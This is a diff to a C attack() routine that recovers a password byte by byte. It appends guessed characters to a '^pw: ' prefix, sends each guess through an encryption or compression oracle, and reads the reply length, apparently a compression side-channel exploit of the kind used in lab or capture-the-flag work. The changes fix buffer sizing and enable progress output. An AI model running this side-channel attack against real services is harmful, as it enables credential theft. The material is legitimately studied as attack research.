@@ -44,7 +44,7 @@ static void printhexdata(const void*d, int len) {
 static int attack(void) {
 	struct Reply rpl;
 	char password[100] = {0};
-	char try[11] = "^pw: ";
+	char try[12] = "^pw: ";
 	int len = 5;
 	int pos = 0;
 	int l;
@@ -55,7 +55,8 @@ static int attack(void) {
 			try[len] = ' ';
 			try[len+1] = '^';
 		}else{
-			try[9] = ' ';
+			try[10] = ' ';
+			try[11] = '^';
 		}
 		enc(try, &rpl);
 		l = rpl.Len;
@@ -64,7 +65,7 @@ static int attack(void) {
 			if(len<10){
 				try[len] = c;
 			}else{
-				try[9] = c;
+				try[10] = c;
 			}
 			enc(try, &rpl);
 			//printf("Try: %s %d\n", try, rpl.Len);
@@ -83,19 +84,19 @@ static int attack(void) {
 		char b[2];
 		b[0] = fc;
 		b[1] = 0;
-		//printf("Next: %s %d\n", b, pos);
+		printf("Next: %s %d\n", b, pos);
 		if(len<10){
 			try[len] = fc;
 		}else{
-			memcpy(try+1, try+2, 7);
-			try[8] = fc;
+			memmove(try+1, try+2, 8);
+			try[9] = fc;
 		}
 		password[pos] = fc;
 		pos++;
 		len++;
 	}
 	enc(password, &rpl);
-	printhexdata(&rpl, sizeof(rpl));
+	//printhexdata(&rpl, sizeof(rpl));
 	printf("\n");
 	if(rpl.Type == Correct) {
 		printf("Password is \"%s\" (%d bytes total message size)\n", password, rpl.Len);
